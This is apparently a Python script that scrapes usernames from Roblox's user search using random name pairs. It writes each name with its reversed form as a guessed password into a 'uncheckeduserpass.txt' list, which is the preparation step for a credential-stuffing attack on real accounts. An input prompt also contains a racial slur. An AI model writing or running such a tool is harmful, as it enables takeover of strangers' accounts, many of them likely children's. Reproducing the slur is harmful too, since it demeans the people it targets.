import random,requests,json,threading


data = { "first": [ "Aaron", "Abigail", "Adam", "Adrian", "Adriana", "Adrienne", "Aimee", "Alan", "Albert", "Alec", "Alejandra", "Alejandro", "Alex", "Alexa", "Alexander", "Alexandra", "Alexandria", "Alexis", "Alfred", "Alice", "Alicia", "Alisha", "Alison", "Allen", "Allison", "Alyssa", "Amanda", "Amber", "Amy", "Ana", "Andre", "Andrea", "Andres", "Andrew", "Angel", "Angela", "Angelica", "Angie", "Anita", "Ann", "Anna", "Anne", "Annette", "Anthony", "Antonio", "April", "Ariana", "Ariel", "Arthur", "Ashlee", "Ashley", "Audrey", "Austin", "Autumn", "Bailey", "Barbara", "Barry", "Becky", "Belinda", "Benjamin", "Bernard", "Beth", "Bethany", "Betty", "Beverly", "Bianca", "Bill", "Billy", "Blake", "Bob", "Bobby", "Bonnie", "Brad", "Bradley", "Brandi", "Brandon", "Brandy", "Breanna", "Brenda", "Brendan", "Brent", "Brett", "Brian", "Briana", "Brianna", "Bridget", "Brittany", "Brittney", "Brooke", "Bruce", "Bryan", "Bryce", "Caitlin", "Caitlyn", "Caleb", "Calvin", "Cameron", "Candace", "Candice", "Carl", "Carla", "Carlos", "Carly", "Carmen", "Carol", "Caroline", "Carolyn", "Carrie", "Casey", "Cassandra", "Cassidy", "Cassie", "Catherine", "Cathy", "Cesar", "Chad", "Charlene", "Charles", "Charlotte", "Chase", "Chelsea", "Chelsey", "Cheryl", "Cheyenne", "Chloe", "Chris", "Christian", "Christie", "Christina", "Christine", "Christopher", "Christy", "Cindy", "Claire", "Clarence", "Claudia", "Clayton", "Clifford", "Clinton", "Cody", "Cole", "Colin", "Colleen", "Collin", "Colton", "Connie", "Connor", "Corey", "Cory", "Courtney", "Craig", "Cristian", "Cristina", "Crystal", "Curtis", "Cynthia", "Daisy", "Dakota", "Dale", "Dalton", "Damon", "Dan", "Dana", "Daniel", "Danielle", "Danny", "Darin", "Darius", "Darlene", "Darrell", "Darren", "Daryl", "Dave", "David", "Dawn", "Dean", "Deanna", "Debbie", "Deborah", "Debra", "Denise", "Dennis", "Derek", "Derrick", "Desiree", "Destiny", "Devin", "Devon", "Diana", "Diane", "Dillon", "Dominic", "Dominique", "Don", "Donald", "Donna", "Doris", "Dorothy", "Douglas", "Drew", "Duane", "Dustin", "Dwayne", "Dylan", "Earl", "Ebony", "Eddie", "Edgar", "Eduardo", "Edward", "Edwin", "Eileen", "Elaine", "Elijah", "Elizabeth", "Ellen", "Emily", "Emma", "Eric", "Erica", "Erik", "Erika", "Erin", "Ernest", "Ethan", "Eugene", "Evan", "Evelyn", "Faith", "Felicia", "Fernando", "Frances", "Francis", "Francisco", "Frank", "Franklin", "Fred", "Frederick", "Gabriel", "Gabriela", "Gabriella", "Gabrielle", "Gail", "Garrett", "Gary", "Gavin", "Geoffrey", "George", "Gerald", "Gilbert", "Gina", "Glen", "Glenda", "Glenn", "Gloria", "Gordon", "Grace", "Grant", "Greg", "Gregg", "Gregory", "Guy", "Gwendolyn", "Hailey", "Haley", "Hannah", "Harold", "Harry", "Hayden", "Hayley", "Heather", "Hector", "Heidi", "Helen", "Henry", "Holly", "Howard", "Hunter", "Ian", "Isaac", "Isabel", "Isabella", "Ivan", "Jack", "Jackie", "Jackson", "Jaclyn", "Jacob", "Jacqueline", "Jade", "Jaime", "Jake", "James", "Jamie", "Jane", "Janet", "Janice", "Jared", "Jasmin", "Jasmine", "Jason", "Javier", "Jay", "Jean", "Jeanette", "Jeanne", "Jeff", "Jeffery", "Jeffrey", "Jenna", "Jennifer", "Jenny", "Jeremiah", "Jeremy", "Jermaine", "Jerome", "Jerry", "Jesse", "Jessica", "Jesus", "Jill", "Jillian", "Jim", "Jimmy", "Jo", "Joan", "Joann", "Joanna", "Joanne", "Jocelyn", "Jodi", "Jody", "Joe", "Joel", "John", "Johnathan", "Johnny", "Jon", "Jonathan", "Jonathon", "Jordan", "Jorge", "Jose", "Joseph", "Joshua", "Joy", "Joyce", "Juan", "Judith", "Judy", "Julia", "Julian", "Julie", "Justin", "Kaitlin", "Kaitlyn", "Kara", "Karen", "Kari", "Karina", "Karl", "Karla", "Katelyn", "Katherine", "Kathleen", "Kathryn", "Kathy", "Katie", "Katrina", "Kayla", "Kaylee", "Keith", "Kelli", "Kellie", "Kelly", "Kelsey", "Kendra", "Kenneth", "Kent", "Kerri", "Kerry", "Kevin", "Kiara", "Kim", "Kimberly", "Kirk", "Kirsten", "Krista", "Kristen", "Kristi", "Kristie", "Kristin", "Kristina", "Kristine", "Kristopher", "Kristy", "Krystal", "Kurt", "Kyle", "Kylie", "Lacey", "Lance", "Larry", "Latasha", "Latoya", "Laura", "Lauren", "Laurie", "Lawrence", "Leah", "Lee", "Leon", "Leonard", "Leroy", "Leslie", "Levi", "Linda", "Lindsay", "Lindsey", "Lisa", "Logan", "Lonnie", "Loretta", "Lori", "Lorraine", "Louis", "Lucas", "Luis", "Luke", "Lydia", "Lynn", "Mackenzie", "Madeline", "Madison", "Makayla", "Malik", "Mallory", "Mandy", "Manuel", "Marc", "Marcia", "Marcus", "Margaret", "Maria", "Mariah", "Marie", "Marilyn", "Mario", "Marisa", "Marissa", "Mark", "Martha", "Martin", "Marvin", "Mary", "Mason", "Mathew", "Matthew", "Maureen", "Maurice", "Max", "Maxwell", "Mckenzie", "Meagan", "Megan", "Meghan", "Melanie", "Melinda", "Melissa", "Melody", "Melvin", "Mercedes", "Meredith", "Mia", "Michael", "Michaela", "Micheal", "Michele", "Michelle", "Miguel", "Mikayla", "Mike", "Mindy", "Miranda", "Misty", "Mitchell", "Molly", "Monica", "Monique", "Morgan", "Nancy", "Natalie", "Natasha", "Nathan", "Nathaniel", "Nicholas", "Nichole", "Nicolas", "Nicole", "Nina", "Noah", "Norma", "Norman", "Olivia", "Omar", "Oscar", "Paige", "Pam", "Pamela", "Parker", "Patricia", "Patrick", "Patty", "Paul", "Paula", "Pedro", "Peggy", "Penny", "Peter", "Philip", "Phillip", "Phyllis", "Preston", "Priscilla", "Rachael", "Rachel", "Ralph", "Randall", "Randy", "Raven", "Ray", "Raymond", "Rebecca", "Rebekah", "Regina", "Reginald", "Renee", "Rhonda", "Ricardo", "Richard", "Rick", "Rickey", "Ricky", "Rita", "Robert", "Roberta", "Roberto", "Robin", "Robyn", "Rodney", "Roger", "Ronald", "Ronnie", "Rose", "Ross", "Roy", "Ruben", "Russell", "Ruth", "Ryan", "Sabrina", "Sally", "Samantha", "Samuel", "Sandra", "Sandy", "Sara", "Sarah", "Savannah", "Scott", "Sean", "Selena", "Sergio", "Seth", "Shane", "Shannon", "Shari", "Sharon", "Shaun", "Shawn", "Shawna", "Sheena", "Sheila", "Shelby", "Shelia", "Shelley", "Shelly", "Sheri", "Sherri", "Sherry", "Sheryl", "Shirley", "Sierra", "Sonia", "Sonya", "Sophia", "Spencer", "Stacey", "Stacie", "Stacy", "Stanley", "Stefanie", "Stephanie", "Stephen", "Steve", "Steven", "Stuart", "Sue", "Summer", "Susan", "Suzanne", "Sydney", "Sylvia", "Tabitha", "Tamara", "Tami", "Tammie", "Tammy", "Tanner", "Tanya", "Tara", "Tasha", "Taylor", "Teresa", "Terri", "Terry", "Theodore", "Theresa", "Thomas", "Tiffany", "Tim", "Timothy", "Tina", "Todd", "Tom", "Tommy", "Toni", "Tony", "Tonya", "Tracey", "Traci", "Tracie", "Tracy", "Travis", "Trevor", "Tricia", "Tristan", "Troy", "Tyler", "Tyrone", "Valerie", "Vanessa", "Veronica", "Vicki", "Vickie", "Victor", "Victoria", "Vincent", "Virginia", "Walter", "Wanda", "Warren", "Wayne", "Wendy", "Wesley", "Whitney", "William", "Willie", "Wyatt", "Xavier", "Yolanda", "Yvette", "Yvonne", "Zachary", "Zoe" ], "last": [ "Abbott", "Acevedo", "Acosta", "Adams", "Adkins", "Aguilar", "Aguirre", "Alexander", "Ali", "Allen", "Allison", "Alvarado", "Alvarez", "Andersen", "Anderson", "Andrews", "Anthony", "Archer", "Arellano", "Arias", "Armstrong", "Arnold", "Arroyo", "Ashley", "Atkins", "Atkinson", "Austin", "Avery", "Avila", "Ayala", "Ayers", "Bailey", "Baird", "Baker", "Baldwin", "Ball", "Ballard", "Banks", "Barber", "Barker", "Barnes", "Barnett", "Barr", "Barrera", "Barrett", "Barron", "Barry", "Bartlett", "Barton", "Bass", "Bates", "Bauer", "Bautista", "Baxter", "Bean", "Beard", "Beasley", "Beck", "Becker", "Bell", "Beltran", "Bender", "Benitez", "Benjamin", "Bennett", "Benson", "Bentley", "Benton", "Berg", "Berger", "Bernard", "Berry", "Best", "Bird", "Bishop", "Black", "Blackburn", "Blackwell", "Blair", "Blake", "Blanchard", "Blankenship", "Blevins", "Bolton", "Bond", "Bonilla", "Booker", "Boone", "Booth", "Bowen", "Bowers", "Bowman", "Boyd", "Boyer", "Boyle", "Bradford", "Bradley", "Bradshaw", "Brady", "Branch", "Brandt", "Braun", "Bray", "Brennan", "Brewer", "Bridges", "Briggs", "Bright", "Brock", "Brooks", "Brown", "Browning", "Bruce", "Bryan", "Bryant", "Buchanan", "Buck", "Buckley", "Bullock", "Burch", "Burgess", "Burke", "Burnett", "Burns", "Burton", "Bush", "Butler", "Byrd", "Cabrera", "Cain", "Calderon", "Caldwell", "Calhoun", "Callahan", "Camacho", "Cameron", "Campbell", "Campos", "Cannon", "Cantrell", "Cantu", "Cardenas", "Carey", "Carlson", "Carney", "Carpenter", "Carr", "Carrillo", "Carroll", "Carson", "Carter", "Case", "Casey", "Castaneda", "Castillo", "Castro", "Cervantes", "Chambers", "Chan", "Chandler", "Chaney", "Chang", "Chapman", "Charles", "Chase", "Chavez", "Chen", "Cherry", "Choi", "Christensen", "Christian", "Chung", "Church", "Cisneros", "Clark", "Clarke", "Clay", "Clayton", "Clements", "Cline", "Cobb", "Cochran", "Coffey", "Cohen", "Cole", "Coleman", "Collier", "Collins", "Colon", "Combs", "Compton", "Conley", "Conner", "Conrad", "Contreras", "Conway", "Cook", "Cooke", "Cooley", "Cooper", "Copeland", "Cordova", "Cortez", "Costa", "Cowan", "Cox", "Craig", "Crane", "Crawford", "Crosby", "Cross", "Cruz", "Cuevas", "Cunningham", "Curry", "Curtis", "Dalton", "Daniel", "Daniels", "Daugherty", "Davenport", "David", "Davidson", "Davies", "Davila", "Davis", "Dawson", "Day", "Dean", "Decker", "Delacruz", "Deleon", "Delgado", "Dennis", "Diaz", "Dillon", "Dixon", "Dodson", "Dominguez", "Donaldson", "Donovan", "Dorsey", "Dougherty", "Douglas", "Downs", "Doyle", "Drake", "Duarte", "Dudley", "Duffy", "Duke", "Duncan", "Dunlap", "Dunn", "Duran", "Durham", "Dyer", "Eaton", "Edwards", "Elliott", "Ellis", "Ellison", "English", "Erickson", "Escobar", "Esparza", "Espinoza", "Estes", "Estrada", "Evans", "Everett", "Ewing", "Farley", "Farmer", "Farrell", "Faulkner", "Ferguson", "Fernandez", "Ferrell", "Fields", "Figueroa", "Finley", "Fischer", "Fisher", "Fitzgerald", "Fitzpatrick", "Fleming", "Fletcher", "Flores", "Flowers", "Floyd", "Flynn", "Foley", "Forbes", "Ford", "Foster", "Fowler", "Fox", "Francis", "Franco", "Frank", "Franklin", "Frazier", "Freeman", "French", "Frey", "Friedman", "Fritz", "Frost", "Fry", "Frye", "Fuentes", "Fuller", "Gaines", "Gallagher", "Gallegos", "Galloway", "Galvan", "Gamble", "Garcia", "Gardner", "Garner", "Garrett", "Garrison", "Garza", "Gates", "Gentry", "George", "Gibbs", "Gibson", "Gilbert", "Giles", "Gill", "Gillespie", "Gilmore", "Glass", "Glenn", "Glover", "Golden", "Gomez", "Gonzales", "Gonzalez", "Good", "Goodman", "Goodwin", "Gordon", "Gould", "Graham", "Grant", "Graves", "Gray", "Green", "Greene", "Greer", "Gregory", "Griffin", "Griffith", "Grimes", "Gross", "Guerra", "Guerrero", "Gutierrez", "Guzman", "Haas", "Hahn", "Hale", "Haley", "Hall", "Hamilton", "Hammond", "Hampton", "Haney", "Hanna", "Hansen", "Hanson", "Hardin", "Harding", "Hardy", "Harmon", "Harper", "Harrell", "Harrington", "Harris", "Harrison", "Hart", "Hartman", "Harvey", "Hatfield", "Hawkins", "Hayden", "Hayes", "Haynes", "Hays", "Heath", "Hebert", "Henderson", "Hendricks", "Hendrix", "Henry", "Hensley", "Henson", "Herman", "Hernandez", "Herrera", "Herring", "Hess", "Hester", "Hickman", "Hicks", "Higgins", "Hill", "Hines", "Hinton", "Ho", "Hobbs", "Hodge", "Hodges", "Hoffman", "Hogan", "Holden", "Holder", "Holland", "Holloway", "Holmes", "Holt", "Hood", "Hooper", "Hoover", "Hopkins", "Horn", "Horne", "Horton", "House", "Houston", "Howard", "Howe", "Howell", "Huang", "Hubbard", "Huber", "Hudson", "Huerta", "Huff", "Huffman", "Hughes", "Hull", "Humphrey", "Hunt", "Hunter", "Hurley", "Hurst", "Hutchinson", "Huynh", "Ibarra", "Ingram", "Irwin", "Jackson", "Jacobs", "Jacobson", "James", "Jarvis", "Jefferson", "Jenkins", "Jennings", "Jensen", "Jimenez", "Johns", "Johnson", "Johnston", "Jones", "Jordan", "Joseph", "Joyce", "Juarez", "Kaiser", "Kane", "Kaufman", "Keith", "Keller", "Kelley", "Kelly", "Kemp", "Kennedy", "Kent", "Kerr", "Key", "Khan", "Kidd", "Kim", "King", "Kirby", "Kirk", "Klein", "Kline", "Knapp", "Knight", "Knox", "Koch", "Kramer", "Krause", "Krueger", "Lam", "Lamb", "Lambert", "Landry", "Lane", "Lang", "Lara", "Larsen", "Larson", "Lawrence", "Lawson", "Le", "Leach", "Leblanc", "Lee", "Leon", "Leonard", "Lester", "Levine", "Levy", "Lewis", "Li", "Lin", "Lindsey", "Little", "Liu", "Livingston", "Lloyd", "Logan", "Long", "Lopez", "Love", "Lowe", "Lowery", "Lozano", "Lucas", "Lucero", "Luna", "Lutz", "Lynch", "Lynn", "Lyons", "Macdonald", "Macias", "Mack", "Madden", "Maddox", "Mahoney", "Maldonado", "Malone", "Mann", "Manning", "Marks", "Marquez", "Marsh", "Marshall", "Martin", "Martinez", "Mason", "Massey", "Mata", "Mathews", "Mathis", "Matthews", "Maxwell", "May", "Mayer", "Maynard", "Mayo", "Mays", "Mcbride", "Mccall", "Mccann", "Mccarthy", "Mccarty", "Mcclain", "Mcclure", "Mcconnell", "Mccormick", "Mccoy", "Mccullough", "Mcdaniel", "Mcdonald", "Mcdowell", "Mcfarland", "Mcgee", "Mcgrath", "Mcguire", "Mcintosh", "Mcintyre", "Mckay", "Mckee", "Mckenzie", "Mckinney", "Mcknight", "Mclaughlin", "Mclean", "Mcmahon", "Mcmillan", "Mcneil", "Mcpherson", "Meadows", "Medina", "Mejia", "Melendez", "Melton", "Mendez", "Mendoza", "Mercado", "Mercer", "Merritt", "Meyer", "Meyers", "Meza", "Michael", "Middleton", "Miles", "Miller", "Mills", "Miranda", "Mitchell", "Molina", "Monroe", "Montes", "Montgomery", "Montoya", "Moody", "Moon", "Mooney", "Moore", "Mora", "Morales", "Moran", "Moreno", "Morgan", "Morris", "Morrison", "Morrow", "Morse", "Morton", "Moses", "Mosley", "Moss", "Moyer", "Mueller", "Mullen", "Mullins", "Munoz", "Murillo", "Murphy", "Murray", "Myers", "Nash", "Navarro", "Neal", "Nelson", "Newman", "Newton", "Nguyen", "Nichols", "Nicholson", "Nielsen", "Nixon", "Noble", "Nolan", "Norman", "Norris", "Norton", "Novak", "Nunez", "Obrien", "Ochoa", "Oconnell", "Oconnor", "Odom", "Odonnell", "Oliver", "Olsen", "Olson", "Oneal", "Oneill", "Orozco", "Orr", "Ortega", "Ortiz", "Osborn", "Osborne", "Owen", "Owens", "Pace", "Pacheco", "Padilla", "Page", "Palmer", "Park", "Parker", "Parks", "Parrish", "Parsons", "Patel", "Patrick", "Patterson", "Patton", "Paul", "Payne", "Pearson", "Peck", "Pena", "Pennington", "Perez", "Perkins", "Perry", "Peters", "Petersen", "Peterson", "Petty", "Pham", "Phelps", "Phillips", "Pierce", "Pineda", "Pittman", "Pitts", "Pollard", "Ponce", "Poole", "Pope", "Porter", "Potter", "Potts", "Powell", "Powers", "Pratt", "Preston", "Price", "Prince", "Proctor", "Pruitt", "Pugh", "Quinn", "Ramirez", "Ramos", "Ramsey", "Randall", "Randolph", "Rangel", "Rasmussen", "Ray", "Raymond", "Reed", "Reese", "Reeves", "Reid", "Reilly", "Reyes", "Reynolds", "Rhodes", "Rice", "Rich", "Richard", "Richards", "Richardson", "Richmond", "Riddle", "Riggs", "Riley", "Rios", "Ritter", "Rivas", "Rivera", "Rivers", "Roach", "Robbins", "Roberson", "Roberts", "Robertson", "Robinson", "Robles", "Rocha", "Rodgers", "Rodriguez", "Rogers", "Rojas", "Rollins", "Roman", "Romero", "Rosales", "Rosario", "Rose", "Ross", "Roth", "Rowe", "Rowland", "Roy", "Rubio", "Ruiz", "Rush", "Russell", "Russo", "Ryan", "Salas", "Salazar", "Salinas", "Sampson", "Sanchez", "Sanders", "Sandoval", "Sanford", "Santana", "Santiago", "Santos", "Saunders", "Savage", "Sawyer", "Schaefer", "Schmidt", "Schmitt", "Schneider", "Schroeder", "Schultz", "Schwartz", "Scott", "Sellers", "Serrano", "Shaffer", "Shah", "Shannon", "Sharp", "Shaw", "Shea", "Shelton", "Shepard", "Shepherd", "Sheppard", "Sherman", "Shields", "Short", "Silva", "Simmons", "Simon", "Simpson", "Sims", "Singh", "Singleton", "Skinner", "Sloan", "Small", "Smith", "Snow", "Snyder", "Solis", "Solomon", "Sosa", "Soto", "Sparks", "Spears", "Spence", "Spencer", "Stafford", "Stanley", "Stanton", "Stark", "Steele", "Stein", "Stephens", "Stephenson", "Stevens", "Stevenson", "Stewart", "Stokes", "Stone", "Stout", "Strickland", "Strong", "Stuart", "Suarez", "Sullivan", "Summers", "Sutton", "Swanson", "Sweeney", "Tanner", "Tapia", "Tate", "Taylor", "Terrell", "Terry", "Thomas", "Thompson", "Thornton", "Todd", "Torres", "Townsend", "Tran", "Travis", "Trevino", "Trujillo", "Tucker", "Turner", "Tyler", "Underwood", "Valdez", "Valencia", "Valentine", "Valenzuela", "Vance", "Vang", "Vargas", "Vasquez", "Vaughan", "Vaughn", "Vazquez", "Vega", "Velasquez", "Velazquez", "Velez", "Villa", "Villanueva", "Villarreal", "Villegas", "Vincent", "Wade", "Wagner", "Walker", "Wall", "Wallace", "Waller", "Walls", "Walsh", "Walter", "Walters", "Walton", "Wang", "Ward", "Ware", "Warner", "Warren", "Washington", "Waters", "Watkins", "Watson", "Watts", "Weaver", "Webb", "Weber", "Webster", "Weeks", "Weiss", "Welch", "Wells", "Werner", "West", "Wheeler", "Whitaker", "White", "Whitehead", "Whitney", "Wiggins", "Wilcox", "Wiley", "Wilkerson", "Wilkins", "Wilkinson", "Williams", "Williamson", "Willis", "Wilson", "Winters", "Wise", "Wolf", "Wolfe", "Wong", "Wood", "Woodard", "Woods", "Woodward", "Wright", "Wu", "Wyatt", "Yang", "Yates", "Yoder", "York", "Young", "Yu", "Zamora", "Zavala", "Zimmerman", "Zuniga" ] }
def RandomName():
    return random.choice(data["first"]) + random.choice(data["last"])



def FindBot():
    while True:
       try:   
        Name = RandomName()   
        r = s.get(f"https://www.roblox.com/search/users/results?maxRows=100&keyword={Name}")  
        for i in range(0,r.json()['TotalResults'],int(r.json()['TotalResults']/10)):
            req = s.get(f"https://www.roblox.com/search/users/results?maxRows=100&keyword={Name}&startIndex={str(i)}")  
            if 'UserSearchResults' in r.json():
                for user in req.json()["UserSearchResults"]:
                    if user["Name"]:
                        if NumbersOnly == True and not any(i.isdigit() for i in user["Name"]):
                            continue
                        Username = user["Name"]
                        Password =  user["Name"][::-1]
                       # print(Username + " password: " +Password)
                        with open("uncheckeduserpass.txt", "a") as file:
                            file.write(Username + ":" + Password + "\n")
                               
       except Exception as err:
            print("error " + str(err))





if __name__ == '__main__':
    s = requests.session()
    question = str(input("only accounts with numbers in name? yes or no: "))
    threads = int(input("how many threads nigga: "))
    if question == "yes":
        NumbersOnly = True
    if question == "no": 
        NumbersOnly = False     
    threading.Thread(target=FindBot).start()
